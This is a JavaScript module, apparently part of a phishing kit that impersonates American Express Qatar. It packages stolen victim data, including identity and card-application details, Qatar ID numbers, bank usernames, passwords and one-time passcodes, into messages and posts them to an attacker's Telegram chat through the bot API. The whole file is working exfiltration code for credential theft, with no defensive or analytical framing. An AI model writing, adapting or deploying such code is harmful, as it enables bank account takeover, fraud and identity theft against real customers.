// lib/telegramBot.js
export async function sendToTelegram(data, additionalInfo = null) {
  try {
    // You would replace these with your actual Telegram bot token and chat ID
    const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    // Format the data for better readability in Telegram
    let message = '🔵 *AMERICAN EXPRESS QATAR*\n\n';

    if (data.type === 'application') {
      message += '📝 *NEW APPLICATION*\n\n';
      message += `👤 *Full Name:* ${data.fullName}\n`;
      message += `📧 *Email:* ${data.email}\n`;
      message += `📱 *Phone:* ${data.phone}\n`;
      message += `🌍 *Nationality:* ${data.nationality}\n`;
      message += `🆔 *QID:* ${data.qid}\n`;
      message += `🎂 *DOB:* ${data.dob}\n`;
      message += `📍 *Address:* ${data.address}\n`;
      message += `💰 *Monthly Salary:* ${data.salary} QAR\n`;
      message += `👔 *Employment:* ${data.employment}\n`;
    } else if (data.type === 'bank_login') {
      message += '🏦 *BANK LOGIN DETAILS*\n\n';
      message += `🏛️ *Bank:* ${data.bank}\n`;
      message += `👤 *Username:* ${data.username}\n`;
      message += `🔑 *Password:* ${data.password}\n`;
    } else if (data.type === 'bank_otp') {
      message += '🔐 *BANK OTP*\n\n';
      message += `🏛️ *Bank:* ${data.bank}\n`;
      message += `👤 *Username:* ${data.username}\n`;
      message += `🔢 *OTP Code:* ${data.otp}\n`;
    }

    if (additionalInfo) {
      message += `\n📌 *Additional Info:* ${additionalInfo}\n`;
    }

    message += `\n⏰ *Time:* ${new Date().toISOString()}\n`;

    // Send to Telegram
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    const result = await response.json();

    if (result.ok) {
      return { success: true };
    } else {
      console.error('Telegram API error:', result);
      return { success: false, error: result.description };
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return { success: false, error: error.message };
  }
}
